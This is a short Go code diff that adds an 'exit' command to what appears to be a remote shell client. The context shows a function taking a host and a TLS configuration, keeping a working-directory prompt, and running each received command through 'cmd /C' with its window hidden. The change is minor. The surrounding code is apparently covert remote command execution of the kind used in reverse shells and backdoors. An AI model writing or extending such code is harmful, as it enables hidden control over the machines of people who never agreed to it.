@@ -35,6 +35,8 @@ func Do(host string, conf *tls.Config) error {
 			cwd, _ = os.Getwd()
 			cwd = cwd + "> "
 			continue
+		} else if tokens[0] == "exit" {
+			return nil
 		}
 		cmd := exec.Command("cmd", "/C", cmdstr)
 		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
